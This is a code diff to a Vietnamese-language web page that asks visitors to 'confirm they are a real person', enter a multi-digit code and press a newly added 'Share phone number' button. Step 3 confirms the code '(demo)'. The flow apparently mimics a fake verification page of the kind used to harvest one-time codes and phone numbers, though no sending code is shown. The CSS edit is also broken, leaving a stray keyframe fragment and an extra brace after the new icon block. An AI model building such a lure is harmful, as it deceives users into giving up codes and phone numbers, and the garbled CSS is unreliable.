@@ -12,7 +12,7 @@ body { margin:0; font-family: Arial; overflow:hidden; }
 .bg {
   position: fixed;
   width:100%; height:100%;
-  background: url("https://i.imgur.com/your-image.jpg") center/cover no-repeat;
+ background: url("https://sf-static.upanhlaylink.com/img/image_2026032489ac597362eda35abeb5a9c04ee65613.jpg") center/cover no-repeat;
   filter: blur(12px);
   transform: scale(1.1);
 }
@@ -34,10 +34,24 @@ body { margin:0; font-family: Arial; overflow:hidden; }
   animation: shake 1s infinite;
 }
 
-@keyframes shake {
-  0% { transform:translate(-50%,-50%) rotate(0deg);}
-  50% { transform:translate(-50%,-50%) rotate(15deg);}
-  100% { transform:translate(-50%,-50%) rotate(0deg);}
+@keyframes wave {
+  0% { transform: translate(-50%, -50%) rotate(0deg); }
+  15% { transform: translate(-50%, -50%) rotate(14deg); }
+  30% { transform: translate(-50%, -50%) rotate(-8deg); }
+  45% { transform: translate(-50%, -50%) rotate(14deg); }
+  60% { transform: translate(-50%, -50%) rotate(-4deg); }
+  75% { transform: translate(-50%, -50%) rotate(10deg); }
+  100% { transform: translate(-50%, -50%) rotate(0deg); }
+}
+
+.icon {
+  position: absolute;
+  top: 30%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  font-size: 90px;
+  animation: wave 1.2s infinite; /* Lặp liên tục */
+}00% { transform:translate(-50%,-50%) rotate(0deg);}
 }
 
 /* box */
@@ -98,9 +112,8 @@ body { margin:0; font-family: Arial; overflow:hidden; }
 
 <!-- STEP 1 -->
 <div class="box" id="step1">
-  Bạn cần xác nhận mình là người thật
+ Bạn cần xác nhận mình là người thật, hãy nhấp vào nút bên dưới để bắt đầu!
 </div>
-
 <button class="btn" onclick="step2()">Xác nhận</button>
 
 <!-- STEP 2 -->
@@ -115,8 +128,10 @@ body { margin:0; font-family: Arial; overflow:hidden; }
     <input maxlength="1" oninput="move(this,4)">
     <input maxlength="1" oninput="move(this,5)">
   </div>
-</div>
 
+  <!-- Nút share số điện thoại -->
+  <button class="btn" onclick="requestPhone()">📲 Chia sẻ số điện thoại</button>
+</div>
 <!-- STEP 3 -->
 <div class="box" id="step3" style="display:none;">
   Bạn đã nhập đúng mã (demo)
